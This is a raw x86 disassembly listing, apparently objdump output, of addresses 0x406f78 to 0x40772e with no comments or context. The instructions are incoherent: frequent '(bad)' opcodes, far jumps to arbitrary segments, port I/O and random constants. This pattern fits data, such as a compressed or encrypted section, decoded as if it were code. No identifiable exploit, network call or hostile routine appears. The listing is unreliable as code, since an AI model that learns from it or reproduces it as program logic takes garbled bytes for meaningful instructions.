  406f78:	adc    BYTE PTR [eax-0x14],dh
  406f7b:	outs   dx,BYTE PTR ds:[esi]
  406f7c:	xchg   edi,eax
  406f7d:	fld    QWORD PTR [eax-0x65]
  406f80:	popa   
  406f81:	add    DWORD PTR [edi+0x7507f8a5],edx
  406f87:	repz test esi,esi
  406f8a:	lods   al,BYTE PTR ds:[esi]
  406f8b:	and    BYTE PTR [esi],cl
  406f8d:	jmp    0x46a1:0x1ed4825
  406f94:	test   al,0x4a
  406f96:	sub    DWORD PTR [eax],0xffffffce
  406f99:	pop    eax
  406f9a:	dec    edx
  406f9b:	popf   
  406f9c:	sub    ebp,DWORD PTR [eax]
  406f9e:	mov    al,0xec
  406fa0:	pop    esp
  406fa1:	mov    ds:0x6f9aae3c,al
  406fa6:	je     0x406f7f
  406fa8:	std    
  406fa9:	push   edx
  406faa:	or     eax,0x25cd3729
  406faf:	cmp    ch,al
  406fb1:	mov    ebp,0x339cbac6
  406fb6:	pop    es
  406fb7:	je     0x406fc4
  406fb9:	test   al,0x3f
  406fbb:	sbb    al,0xc2
  406fbd:	ins    BYTE PTR es:[edi],dx
  406fbe:	xchg   edx,eax
  406fbf:	icebp  
  406fc0:	aad    0x76
  406fc2:	inc    ebx
  406fc3:	cmp    al,0xce
  406fc5:	enter  0x369d,0x0
  406fc9:	mov    bh,0x63
  406fcb:	dec    ecx
  406fcc:	lods   eax,DWORD PTR ds:[esi]
  406fcd:	jne    0x406fdf
  406fcf:	jns    0x406f7a
  406fd1:	add    eax,0x604ca9db
  406fd6:	fwait
  406fd7:	mov    cl,0x4e
  406fd9:	shr    bh,1
  406fdb:	add    eax,esi
  406fdd:	ss aas 
  406fdf:	xor    BYTE PTR ds:0x2282e469,0x70
  406fe6:	jmp    0x3db6bd13
  406feb:	(bad)  
  406fec:	js     0x406fc9
  406fee:	adc    BYTE PTR [edx-0x67],dl
  406ff1:	imul   ecx,DWORD PTR [esi],0x54
  406ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ff5:	push   0x97441dc7
  406ffa:	not    al
  406ffc:	jno    0x406f90
  406ffe:	inc    esi
  406fff:	xlat   BYTE PTR ds:[ebx]
  407000:	sub    edx,DWORD PTR [edx]
  407002:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407004:	push   es
  407005:	das    
  407006:	ret    0x8918
  407009:	fmul   QWORD PTR [eax-0x55]
  40700c:	sbb    DWORD PTR [ebx+0x34],ecx
  40700f:	repz imul ebp,DWORD PTR [edx-0x53],0x5e
  407014:	adc    esi,DWORD PTR [ecx]
  407016:	push   ss
  407017:	dec    edx
  407018:	sbb    al,0xe3
  40701a:	int    0x15
  40701c:	fisttp QWORD PTR [esi+0x38]
  40701f:	outs   dx,BYTE PTR ds:[esi]
  407020:	out    0xb4,eax
  407022:	mov    ah,0xd1
  407024:	pop    es
  407025:	inc    esp
  407026:	not    ah
  407028:	or     DWORD PTR [edx],eax
  40702a:	stos   DWORD PTR es:[edi],eax
  40702b:	stc    
  40702c:	jl     0x40701d
  40702e:	sbb    eax,0xf60184bc
  407033:	jl     0x406ff9
  407035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407036:	sbb    eax,0xe42b7a57
  40703b:	mov    bl,0x42
  40703d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40703e:	mov    ebp,0x6db3300c
  407043:	rep ins BYTE PTR es:[edi],dx
  407045:	fimul  WORD PTR [ebp-0x79]
  407048:	pop    DWORD PTR [eax+0x6df26248]
  40704e:	jmp    0x5b11:0xe631e00
  407055:	aas    
  407056:	mov    ch,0x5
  407058:	fimul  WORD PTR [edx+edx*2]
  40705b:	out    0x36,eax
  40705d:	xor    BYTE PTR [esi+0x75efafc2],ah
  407063:	out    0x22,al
  407065:	enter  0x424b,0xc8
  407069:	jo     0x407010
  40706b:	sahf   
  40706c:	sbb    al,0xd2
  40706e:	or     ecx,esi
  407070:	(bad)  
  407071:	les    edi,FWORD PTR [ebp+0x7c]
  407074:	inc    eax
  407075:	mov    ds:0x3d596748,al
  40707a:	ins    DWORD PTR es:[edi],dx
  40707b:	jb     0x40703b
  40707d:	add    cl,bl
  40707f:	sahf   
  407080:	arpl   WORD PTR [ecx+0x4b],ax
  407083:	sti    
  407084:	fcomp  QWORD PTR [edx+0x35567802]
  40708a:	imul   ebp,ebx,0xffffffc0
  40708d:	retf   
  40708e:	jnp    0x4070a5
  407090:	clc    
  407091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407092:	enter  0x935e,0x9
  407096:	jmp    0x65141d2d
  40709b:	xlat   BYTE PTR ds:[ebx]
  40709c:	mov    cl,0x5d
  40709e:	sub    edi,ecx
  4070a0:	daa    
  4070a1:	push   eax
  4070a2:	test   al,0x3f
  4070a4:	sbb    DWORD PTR [eax-0x7ca2151a],eax
  4070aa:	sti    
  4070ab:	mov    dh,0x4f
  4070ad:	clc    
  4070ae:	xor    edx,esp
  4070b0:	stos   DWORD PTR es:[edi],eax
  4070b1:	pop    esp
  4070b2:	push   esi
  4070b3:	and    eax,0xc4ee19bd
  4070b8:	(bad)  
  4070b9:	jge    0x40711f
  4070bb:	jns    0x407134
  4070bd:	xor    bl,BYTE PTR [ebx-0x2e]
  4070c0:	push   0x856f5fd
  4070c5:	cmp    BYTE PTR [eax],dh
  4070c7:	fs sti 
  4070c9:	sbb    al,0x61
  4070cb:	jp     0x4070f4
  4070cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ce:	push   es
  4070cf:	push   ds
  4070d0:	xchg   ebx,eax
  4070d1:	hlt    
  4070d2:	push   edi
  4070d3:	test   esi,edi
  4070d5:	mov    esi,0xd2c9519
  4070da:	lods   eax,DWORD PTR ds:[esi]
  4070db:	cmc    
  4070dc:	or     esi,0xd03c007e
  4070e2:	mov    ch,0xb6
  4070e4:	push   ebp
  4070e5:	inc    BYTE PTR ds:0x9a7d3929
  4070eb:	imul   esp,eax,0x595491e4
  4070f1:	lods   eax,DWORD PTR ds:[esi]
  4070f2:	(bad)  
  4070f3:	mov    edi,0xadd71ede
  4070f8:	xlat   BYTE PTR ds:[ebx]
  4070f9:	mov    bh,0x3a
  4070fb:	pop    ebp
  4070fc:	xor    ecx,esi
  4070fe:	clc    
  4070ff:	retf   0x7f57
  407102:	sti    
  407103:	add    DWORD PTR gs:[edx-0x4],0x9715b1e4
  40710b:	dec    esi
  40710c:	pop    edi
  40710d:	idiv   DWORD PTR [edx+0x227ed4f6]
  407113:	xchg   DWORD PTR [edx],esi
  407115:	lods   eax,DWORD PTR ds:[esi]
  407116:	pusha  
  407117:	mov    dl,0x8b
  407119:	cmp    ebx,edi
  40711b:	mov    esi,edi
  40711d:	mov    WORD PTR [edi-0x148d3123],es
  407123:	dec    ebx
  407124:	cmc    
  407125:	dec    edi
  407126:	(bad)  
  407128:	fnstsw WORD PTR [esi]
  40712a:	jnp    0x407199
  40712c:	ret    
  40712d:	sahf   
  40712e:	jbe    0x4070db
  407130:	push   ds
  407131:	call   0x3ee97c42
  407136:	fistp  WORD PTR [esi-0x17]
  407139:	pop    edi
  40713a:	out    0xc0,al
  40713c:	fcom   DWORD PTR [ebx-0x24ced2c9]
  407142:	jl     0x4070f2
  407144:	cs retf 0x2cf1
  407148:	aam    0xd0
  40714a:	pushf  
  40714b:	hlt    
  40714c:	fs jl  0x40717f
  40714f:	stos   BYTE PTR es:[edi],al
  407150:	mov    bh,0x71
  407152:	(bad)
  407155:	xor    al,0x3b
  407157:	cmp    edi,DWORD PTR [esp+ebp*2]
  40715a:	mov    al,ds:0x2c05724a
  40715f:	cs jecxz 0x40711e
  407162:	mov    edx,0xa7b8db73
  407167:	mov    edi,0x136871d0
  40716c:	xor    BYTE PTR [edx],0x25
  40716f:	add    bh,ah
  407171:	jecxz  0x40712e
  407173:	inc    ebp
  407174:	(bad)  
  407175:	adc    BYTE PTR [ebx-0x39b64bfb],bl
  40717b:	loope  0x4071d0
  40717d:	in     al,dx
  40717e:	inc    edi
  40717f:	pop    es
  407180:	stos   BYTE PTR es:[edi],al
  407181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407182:	(bad)  
  407183:	mov    edi,0xdb73aaab
  407188:	mov    ds:0x3c786280,al
  40718d:	pusha  
  40718e:	lea    eax,ds:0x23a589f6
  407194:	ins    DWORD PTR es:[edi],dx
  407195:	(bad)
  407198:	es iret 
  40719a:	or     DWORD PTR [edx+0x24],ebp
  40719d:	mov    al,0xf7
  40719f:	arpl   di,ax
  4071a1:	aas    
  4071a2:	fucomp st(2)
  4071a4:	in     eax,0x91
  4071a6:	cmp    ebx,DWORD PTR [edi+ebx*2-0x2f]
  4071aa:	jns    0x40718b
  4071ac:	adc    al,0xc7
  4071ae:	xchg   edx,eax
  4071af:	push   ebp
  4071b0:	sar    ecx,1
  4071b2:	and    esp,esp
  4071b4:	lods   al,BYTE PTR ds:[esi]
  4071b5:	inc    eax
  4071b6:	xor    BYTE PTR [ebx-0x2ffe5667],ah
  4071bc:	aam    0xa7
  4071be:	jmp    0x6331:0x86917f7a
  4071c5:	in     eax,0x39
  4071c7:	ror    DWORD PTR [esi],1
  4071c9:	sub    DWORD PTR [esi+0x4ed71de0],ecx
  4071cf:	mov    ds:0x19366ad,eax
  4071d4:	rcl    DWORD PTR [edx],1
  4071d6:	sbb    DWORD PTR [edi+0x16],edi
  4071d9:	adc    al,0xf3
  4071db:	mov    dh,0xbf
  4071dd:	in     al,0xde
  4071df:	or     BYTE PTR [esi],0xcf
  4071e2:	mov    esp,0x769bc70c
  4071e7:	sub    ch,BYTE PTR [ebx+0x3]
  4071ea:	aas    
  4071eb:	pop    edx
  4071ec:	idiv   esp
  4071ee:	pop    ebx
  4071ef:	stos   DWORD PTR es:[edi],eax
  4071f0:	arpl   WORD PTR [edi-0x7d],sp
  4071f3:	popa   
  4071f4:	xchg   edi,eax
  4071f5:	mov    esi,0xaf7ff295
  4071fa:	mov    al,ds:0x229ee94e
  4071ff:	cld    
  407200:	int3   
  407201:	mov    ah,0x19
  407203:	popf   
  407204:	inc    esp
  407205:	push   cs
  407206:	sahf   
  407207:	js     0x40721d
  407209:	lock test BYTE PTR [edx],bh
  40720c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40720d:	mov    ch,al
  40720f:	je     0x40728a
  407211:	and    BYTE PTR [ebx+0xd],cl
  407214:	sar    DWORD PTR [edx+0x29],cl
  407217:	(bad)  
  407219:	jecxz  0x40720f
  40721b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40721c:	jge    0x407221
  40721e:	push   edx
  40721f:	lods   al,BYTE PTR ds:[esi]
  407220:	dec    esi
  407221:	push   DWORD PTR [ebx+0x63]
  407224:	jo     0x4071c9
  407226:	push   cs
  407227:	outs   dx,BYTE PTR ds:[esi]
  407228:	(bad)  
  407229:	jp     0x407253
  40722b:	shr    BYTE PTR [edi+0x36],0xdc
  40722f:	out    0xae,eax
  407231:	add    BYTE PTR [ebx],bh
  407233:	sbb    bh,cl
  407235:	pop    ds
  407236:	inc    edx
  407237:	sbb    DWORD PTR [eax-0x3],esp
  40723a:	mov    edi,0x4d7060d0
  40723f:	inc    ebx
  407240:	mov    bl,0x15
  407242:	aad    0x77
  407244:	(bad)  
  407246:	mov    esp,0x94284207
  40724b:	(bad)  
  40724c:	push   esp
  40724d:	cmp    DWORD PTR [ebx],esi
  40724f:	retf   0x375d
  407252:	and    eax,ebp
  407254:	push   ebp
  407255:	mov    al,ds:0xc118e06b
  40725a:	jp     0x407283
  40725c:	mov    al,0x5a
  40725e:	adc    al,0x1e
  407260:	jmp    0x1cd1:0xfac32e3b
  407267:	mov    ebx,0xba474229
  40726c:	les    edx,FWORD PTR [esi-0x52c83272]
  407272:	xor    BYTE PTR [esp+ebp*1-0x64],dl
  407276:	(bad)  
  407277:	jg     0x4072c4
  407279:	push   ecx
  40727a:	fdivr  QWORD PTR [esi*2+0xe10a332]
  407281:	mov    esp,0x784808b0
  407286:	mov    al,BYTE PTR [eax]
  407288:	xchg   edi,eax
  407289:	ret    
  40728a:	mov    DWORD PTR ds:0x286dd5b1,ecx
  407290:	jle    0x40729d
  407292:	push   ebp
  407293:	xor    dh,BYTE PTR [edi+0x512de595]
  407299:	stc    
  40729a:	fstp   st(4)
  40729c:	push   eax
  40729d:	mov    WORD PTR [esi+0x2b],es
  4072a0:	mov    esi,0xb6fa1e17
  4072a5:	jmp    0x93981fcb
  4072aa:	sahf   
  4072ab:	aas    
  4072ac:	mov    ch,0xdb
  4072ae:	in     eax,0x5e
  4072b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072b1:	pop    ss
  4072b2:	mov    edi,0x8902efe3
  4072b7:	(bad)  
  4072b9:	pop    ebp
  4072ba:	mov    ds:0x9e233091,al
  4072bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c0:	les    edi,FWORD PTR [edi+0x7415cc44]
  4072c6:	mov    cs,WORD PTR [eax+0x5d]
  4072c9:	xchg   ecx,eax
  4072ca:	mov    ch,0xd1
  4072cc:	lods   eax,DWORD PTR ds:[esi]
  4072cd:	ins    BYTE PTR es:[edi],dx
  4072ce:	repnz ins BYTE PTR es:[edi],dx
  4072d0:	jmp    0x407252
  4072d2:	test   al,0xd6
  4072d4:	lods   eax,DWORD PTR ds:[esi]
  4072d5:	shl    BYTE PTR ds:0xaa1ec5f,1
  4072db:	mov    esp,DWORD PTR [eax+0x56]
  4072de:	popa   
  4072df:	aaa    
  4072e0:	xchg   DWORD PTR [esi+0x6c068015],esp
  4072e6:	push   0xee6242df
  4072eb:	sbb    DWORD PTR [edi],0x7641f1b4
  4072f1:	sbb    al,0x52
  4072f3:	pop    esp
  4072f4:	mov    esp,0xd7763d19
  4072f9:	pop    edi
  4072fa:	xchg   ebx,eax
  4072fb:	push   ecx
  4072fc:	rol    DWORD PTR [ecx+esi*1-0x69617363],1
  407303:	mov    dl,dl
  407305:	xchg   ebp,eax
  407306:	ret    
  407307:	pop    esp
  407308:	sahf   
  407309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40730a:	fincstp 
  40730c:	data16 jg 0x407304
  40730f:	xchg   ecx,eax
  407310:	cli    
  407311:	shr    edi,0x66
  407314:	mov    eax,?
  407316:	mov    dl,BYTE PTR [eax+edi*8]
  407319:	pop    edx
  40731a:	pcmpgtb mm7,QWORD PTR [esi]
  40731d:	clc    
  40731e:	dec    ecx
  40731f:	dec    esi
  407320:	adc    al,0xba
  407322:	aam    0x6a
  407324:	out    0x7a,al
  407326:	fnstcw WORD PTR [ebx-0x4c9ecbdc]
  40732c:	sbb    edx,edx
  40732e:	xchg   edx,eax
  40732f:	mov    cl,0x90
  407331:	repnz aam 0x2
  407334:	sub    BYTE PTR [ecx-0x6393cd1e],al
  40733a:	cli    
  40733b:	icebp  
  40733c:	stos   DWORD PTR es:[edi],eax
  40733d:	in     eax,dx
  40733e:	xor    al,0x7c
  407340:	push   0x58
  407342:	cmp    al,0xf0
  407344:	out    0x7e,al
  407346:	jae    0x4073b9
  407348:	and    ch,BYTE PTR [eax+0x1ed73e82]
  40734e:	stos   DWORD PTR es:[edi],eax
  40734f:	adc    al,0xa
  407351:	rcr    BYTE PTR [ebx],0xdd
  407354:	cdq    
  407355:	push   ds
  407356:	ds and ecx,esi
  407359:	xor    ecx,DWORD PTR fs:[esi+0x7cb6a803]
  407360:	lds    esi,FWORD PTR [eax+0x10]
  407363:	mov    ebx,0x22f0214f
  407368:	adc    BYTE PTR [esi],0x95
  40736b:	dec    ecx
  40736c:	hlt    
  40736d:	add    esp,DWORD PTR [eax-0x71e00e53]
  407373:	out    dx,al
  407374:	rcl    DWORD PTR [ebx+0x48e3c429],cl
  40737a:	out    0xa2,eax
  40737c:	mov    esp,0x26f8efe6
  407381:	or     ebx,DWORD PTR [edx+0x448c825a]
  407387:	and    al,0x22
  407389:	sahf   
  40738a:	(bad)  
  40738b:	ja     0x4073f3
  40738d:	jnp    0x4073ca
  40738f:	xor    ebx,esi
  407391:	outs   dx,DWORD PTR ds:[esi]
  407392:	mov    al,0x5f
  407394:	sub    eax,0xb124b0f
  407399:	ins    DWORD PTR es:[edi],dx
  40739a:	push   cs
  40739b:	sbb    al,0x71
  40739d:	ds push 0xffffffce
  4073a0:	inc    edi
  4073a1:	int3   
  4073a2:	pushf  
  4073a3:	ds sti 
  4073a5:	popf   
  4073a6:	int    0x9a
  4073a8:	sti    
  4073a9:	adc    DWORD PTR [ebx+0x21],ebp
  4073ac:	cmp    ecx,eax
  4073ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073af:	sbb    eax,0xef9cec30
  4073b4:	rcr    BYTE PTR [eax+0x62dfa41d],cl
  4073ba:	xchg   ebp,eax
  4073bb:	pmaddwd mm4,QWORD PTR [edx-0x1d]
  4073bf:	leave  
  4073c0:	jbe    0x407412
  4073c2:	std    
  4073c3:	mov    ebx,0x3ef9a675
  4073c8:	jecxz  0x4073fb
  4073ca:	jne    0x407369
  4073cc:	inc    eax
  4073cd:	adc    al,0xa1
  4073cf:	out    dx,eax
  4073d0:	dec    edx
  4073d1:	mov    al,0x67
  4073d3:	sbb    ah,bh
  4073d5:	jmp    0x34db:0x4be631cc
  4073dc:	jne    0x407362
  4073de:	sti    
  4073df:	push   es
  4073e0:	ficomp WORD PTR [esi-0x58d8dd6f]
  4073e6:	fldenv [ebx]
  4073e8:	daa    
  4073e9:	pop    ebp
  4073ea:	sbb    eax,0xf567adbd
  4073ef:	(bad)  
  4073f1:	push   esi
  4073f2:	out    dx,al
  4073f3:	retf   
  4073f4:	xchg   edx,eax
  4073f5:	jl     0x407421
  4073f7:	mov    eax,ds:0x7b37b335
  4073fc:	sub    ebx,DWORD PTR [edx-0x2d]
  4073ff:	stos   BYTE PTR es:[edi],al
  407400:	arpl   WORD PTR [esi-0x5d],bx
  407403:	xor    al,0xc0
  407405:	call   0x56ac:0x3e117591
  40740c:	adc    al,0x34
  40740e:	pop    ebp
  40740f:	ins    DWORD PTR es:[edi],dx
  407410:	in     al,dx
  407411:	mov    dl,0x0
  407413:	nop
  407414:	stos   DWORD PTR es:[edi],eax
  407415:	mov    WORD PTR [eax+0x7d6852f2],ss
  40741b:	ret    0xcbb9
  40741e:	lahf   
  40741f:	out    dx,eax
  407420:	lea    ebp,[edi]
  407422:	sbb    dl,bl
  407424:	mov    ds:0xe0905fa5,al
  407429:	test   al,0xfb
  40742b:	jl     0x407478
  40742d:	je     0x40744e
  40742f:	jno    0x407455
  407431:	out    dx,al
  407432:	mov    cl,0x7c
  407434:	sbb    BYTE PTR [ecx+0x63be4dbd],0x3f
  40743b:	out    dx,eax
  40743c:	jne    0x407498
  40743e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743f:	(bad)  
  407440:	or     al,dl
  407442:	jecxz  0x407486
  407444:	dec    edx
  407445:	pop    edx
  407446:	les    eax,FWORD PTR ss:[edx+0x56cf0693]
  40744d:	xor    al,0x7d
  40744f:	adc    cl,cl
  407451:	popa   
  407452:	pop    eax
  407453:	stc    
  407454:	push   eax
  407455:	(bad)  
  407456:	xchg   ebx,ebx
  407458:	dec    esp
  407459:	or     eax,0x7824dbb1
  40745e:	xor    eax,0x7ea2ae0
  407463:	cmp    DWORD PTR ds:[ebx],0x6
  407467:	bndldx bnd3,[eax]
  40746a:	jl     0x4074d8
  40746c:	pop    ds
  40746d:	ins    BYTE PTR es:[edi],dx
  40746e:	mov    ecx,0xcb717d43
  407473:	lea    ecx,[ebp+0x63d84af9]
  407479:	mov    ds:0xd8eac0bc,eax
  40747e:	dec    edx
  40747f:	sub    al,0x7d
  407481:	mov    al,ds:0x11a05177
  407486:	in     al,dx
  407487:	imul   ebp,DWORD PTR [edx],0x272651b6
  40748d:	push   ebp
  40748e:	xor    al,BYTE PTR [ecx+eax*2+0x6d0e6258]
  407495:	inc    ebp
  407496:	sub    eax,0xdd0c4c4f
  40749b:	sub    eax,0xc807de6e
  4074a0:	mov    al,ds:0xb2ff2b19
  4074a5:	(bad)  
  4074a6:	out    dx,eax
  4074a7:	(bad)  
  4074a8:	dec    DWORD PTR [edi]
  4074aa:	dec    ebx
  4074ab:	(bad)  
  4074ac:	les    ecx,FWORD PTR [eax-0x8]
  4074af:	mov    dh,0x63
  4074b1:	mov    edi,0xb558943d
  4074b6:	dec    ebp
  4074b7:	int3   
  4074b8:	js     0x4074a0
  4074ba:	stos   BYTE PTR es:[edi],al
  4074bb:	add    esi,DWORD PTR [ecx+eiz*1]
  4074be:	or     eax,0x390fba96
  4074c3:	sub    BYTE PTR [ebx],dl
  4074c5:	lods   eax,DWORD PTR ds:[esi]
  4074c6:	test   ecx,ebx
  4074c8:	fisub  WORD PTR [esi]
  4074ca:	mov    ch,0xcc
  4074cc:	clc    
  4074cd:	je     0x4074ca
  4074cf:	jne    0x407452
  4074d1:	and    ecx,0x7938bc9f
  4074d7:	nop
  4074d8:	mov    ebp,0x5725b4e2
  4074dd:	mov    eax,0x8f64215d
  4074e2:	inc    esi
  4074e3:	(bad)  
  4074e4:	adc    DWORD PTR [esi-0x64],edx
  4074e7:	xchg   ebx,eax
  4074e8:	shr    dl,0xcd
  4074eb:	mov    eax,ds:0xe8859a38
  4074f0:	popf   
  4074f1:	cdq    
  4074f2:	add    DWORD PTR [ebx-0x4268142b],0xffffffb8
  4074f9:	stos   BYTE PTR es:[edi],al
  4074fa:	add    eax,0x2c853651
  4074ff:	int3   
  407500:	or     al,al
  407502:	push   ss
  407503:	mov    ch,0x45
  407505:	or     eax,0xcf6cf957
  40750a:	adc    eax,ebx
  40750c:	mov    eax,0x4c99125c
  407511:	imul   esi,DWORD PTR [esi],0xa1c94f9a
  407517:	test   BYTE PTR [esi+esi*4],dh
  40751a:	sub    al,cl
  40751c:	in     eax,0xe7
  40751e:	jge    0x4074ce
  407520:	xchg   edi,eax
  407521:	leave  
  407522:	pop    ecx
  407523:	xor    DWORD PTR [eax+0x7333a9bd],esi
  407529:	lods   eax,DWORD PTR ds:[esi]
  40752a:	cmp    eax,0x4b5ed886
  40752f:	sub    bl,BYTE PTR [edi-0x571a598f]
  407535:	push   ds
  407536:	pop    ecx
  407537:	dec    ebx
  407538:	jne    0x407593
  40753a:	or     ah,BYTE PTR [esi+0x39]
  40753d:	or     eax,DWORD PTR ds:0xbc108d0f
  407543:	out    dx,al
  407544:	dec    esp
  407545:	outs   dx,BYTE PTR ds:[esi]
  407546:	inc    ebx
  407547:	inc    edx
  407548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407549:	es jmp 0xe8efd395
  40754f:	xor    DWORD PTR [edx-0x2f],ebx
  407552:	out    0x8e,al
  407554:	test   ebp,esi
  407556:	pop    ebp
  407557:	cmp    BYTE PTR [esi],bh
  407559:	xor    bl,BYTE PTR [eax-0x1]
  40755c:	mov    al,ds:0x5df4987a
  407561:	mov    al,ds:0x7d1a6f93
  407566:	mov    eax,0x274e05fe
  40756b:	xchg   edx,eax
  40756c:	dec    ebp
  40756d:	jb     0x407569
  40756f:	adc    edi,DWORD PTR [ebp+0x51]
  407572:	add    esp,DWORD PTR [eax+0x7d]
  407575:	outs   dx,DWORD PTR ds:[esi]
  407576:	outs   dx,DWORD PTR ds:[esi]
  407577:	add    esp,edi
  407579:	or     esi,DWORD PTR [ecx-0x6cb5f0d4]
  40757f:	cmp    esp,DWORD PTR [ecx+ebx*8]
  407582:	dec    edx
  407583:	cs ins DWORD PTR es:[edi],dx
  407585:	mov    DWORD PTR [ecx-0x1e],0x7fafe1a3
  40758c:	imul   eax,DWORD PTR [ebx+0x4be96e32],0x897fcd06
  407596:	jns    0x407567
  407598:	fwait
  407599:	mov    ah,0x68
  40759b:	jne    0x407532
  40759d:	aam    0xfe
  40759f:	mov    al,0x20
  4075a1:	xchg   esp,eax
  4075a2:	dec    esi
  4075a3:	sbb    ecx,ebx
  4075a5:	jmp    0x3ea3:0x57727d
  4075ac:	sbb    eax,0x5b8ca741
  4075b1:	mov    al,0x39
  4075b3:	fcomp  QWORD PTR [eax-0x21]
  4075b6:	jmp    0x3fbff14
  4075bb:	cs push edi
  4075bd:	gs mov ah,0x4e
  4075c0:	nop
  4075c1:	das    
  4075c2:	jmp    0xffff:0xe3c1e8c9
  4075c9:	jmp    0x8a3bd817
  4075ce:	add    DWORD PTR [ecx+0x7972ca28],ecx
  4075d4:	pop    edi
  4075d5:	popa   
  4075d6:	jp     0x407590
  4075d8:	xor    edi,DWORD PTR [edx]
  4075da:	jb     0x407597
  4075dc:	push   0x35
  4075de:	lds    ebx,FWORD PTR ds:0xcd10ab35
  4075e4:	push   ebx
  4075e5:	mov    esi,0xbc5a0066
  4075ea:	jne    0x40757d
  4075ec:	pop    ebx
  4075ed:	shr    DWORD PTR [edx-0x4a84aa57],0xbc
  4075f4:	shl    DWORD PTR [edx+0x574e6855],1
  4075fa:	xor    al,0xe7
  4075fc:	(bad)  
  4075fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075fe:	mov    eax,0x14fc0f15
  407603:	jg     0x407683
  407605:	repnz ins BYTE PTR es:[edi],dx
  407607:	mov    ?,ebx
  407609:	rcl    DWORD PTR [edi-0x74],cl
  40760c:	xor    eax,DWORD PTR [esi]
  40760e:	fsubp  st(2),st
  407610:	sbb    esi,0xd6a73a00
  407616:	xchg   ecx,eax
  407617:	xchg   DWORD PTR [esi-0x6c],ebx
  40761a:	and    BYTE PTR [ebp+0x59d72ea1],ch
  407620:	in     eax,0x88
  407622:	cmp    ecx,edi
  407624:	rol    BYTE PTR [ebx+0x6cbaab2a],1
  40762a:	lods   eax,DWORD PTR ds:[esi]
  40762c:	shl    esp,cl
  40762e:	cmp    DWORD PTR [eax],ebx
  407630:	xchg   ebx,eax
  407631:	std    
  407632:	jmp    0x8104:0x88355a6a
  407639:	jl     0x4075e8
  40763b:	xlat   BYTE PTR ds:[ebx]
  40763c:	pop    edx
  40763d:	js     0x407630
  40763f:	mov    ah,0xb1
  407641:	dec    ebx
  407642:	ja     0x407651
  407644:	and    eax,0x7bb38153
  407649:	add    ecx,DWORD PTR [edx]
  40764b:	mov    esp,0xa99e8e7c
  407650:	dec    eax
  407651:	lods   al,BYTE PTR ds:[esi]
  407652:	shl    BYTE PTR [ecx+0x76bc1e26],cl
  407658:	add    eax,DWORD PTR [esi+eiz*4]
  40765b:	push   0xcdaf5db5
  407660:	aam    0x48
  407662:	sar    BYTE PTR [ecx+ebx*8],0x3d
  407666:	ret    
  407667:	push   ebx
  407668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407669:	mov    ds:0xa61b4246,eax
  40766e:	int    0xbd
  407670:	jg     0x407601
  407672:	es sbb eax,0x3f5e92a2
  407678:	jle    0x40767c
  40767a:	mov    ss,WORD PTR [edx]
  40767c:	inc    edi
  40767d:	sahf   
  40767e:	inc    edx
  40767f:	leave  
  407680:	cmp    bl,bl
  407682:	pop    ecx
  407683:	sbb    BYTE PTR [ebx],dh
  407685:	clc    
  407686:	mov    DWORD PTR [eax+0x7f0a8013],ebp
  40768c:	movups XMMWORD PTR [eax+0x60ec7126],xmm3
  407693:	and    DWORD PTR [eax-0x55],ebx
  407696:	xchg   edi,eax
  407697:	fs in  al,dx
  407699:	repnz dec esp
  40769b:	push   esp
  40769c:	dec    esi
  40769d:	repz pop eax
  40769f:	dec    edi
  4076a0:	cli    
  4076a1:	es mov bl,0xe6
  4076a4:	pop    edx
  4076a5:	mov    bh,0x12
  4076a7:	cwde   
  4076a8:	xchg   edx,eax
  4076a9:	mov    ah,0x6a
  4076ab:	lods   al,BYTE PTR ds:[esi]
  4076ac:	outs   dx,DWORD PTR ds:[esi]
  4076ad:	xor    eax,0x2ada3f8b
  4076b2:	pop    es
  4076b3:	jle    0x407688
  4076b5:	xor    esi,DWORD PTR [esi]
  4076b7:	es daa 
  4076b9:	push   ebx
  4076ba:	iret   
  4076bb:	enter  0xa7d8,0x39
  4076bf:	lahf   
  4076c0:	adc    BYTE PTR [ecx-0x64],0xed
  4076c4:	aas    
  4076c5:	call   FWORD PTR [esi+0x4f]
  4076c8:	into   
  4076c9:	inc    ecx
  4076ca:	mov    dh,0x46
  4076cc:	push   es
  4076cd:	out    0x6a,eax
  4076cf:	bound  eax,QWORD PTR ds:0x10c87574
  4076d5:	sub    ebx,DWORD PTR [eax]
  4076d7:	and    DWORD PTR [esp+edx*2],esp
  4076da:	int    0xa5
  4076dc:	cmc    
  4076dd:	arpl   WORD PTR [eax+ecx*2+0x175fd5c5],bx
  4076e4:	outs   dx,WORD PTR ds:[esi]
  4076e6:	mov    ebp,0x15d16022
  4076eb:	sub    DWORD PTR [esi],esp
  4076ed:	out    dx,eax
  4076ee:	jp     0x4076b1
  4076f0:	pop    ebx
  4076f1:	outs   dx,BYTE PTR ds:[esi]
  4076f2:	jecxz  0x407714
  4076f4:	add    bl,BYTE PTR [ebx+0x2e]
  4076f7:	lods   al,BYTE PTR ds:[esi]
  4076f8:	jb     0x4076b4
  4076fa:	cwde   
  4076fb:	adc    al,0xd3
  4076fd:	xor    eax,0xa3592aa7
  407702:	pop    ebp
  407703:	retf   0xd9e7
  407706:	push   edx
  407707:	xchg   DWORD PTR [eax+0x10e176fb],ebx
  40770d:	dec    eax
  40770e:	xor    BYTE PTR ds:0xd47ab5a6,al
  407714:	adc    eax,0x3e1f89dc
  407719:	mov    ebx,0xfa349012
  40771e:	test   eax,0xcf106c46
  407723:	mov    bh,0xed
  407725:	mov    cl,0x2b
  407727:	sbb    DWORD PTR [ecx+0x3d3f9314],esi
  40772d:	pop    es
  40772e:	jb     0x407745
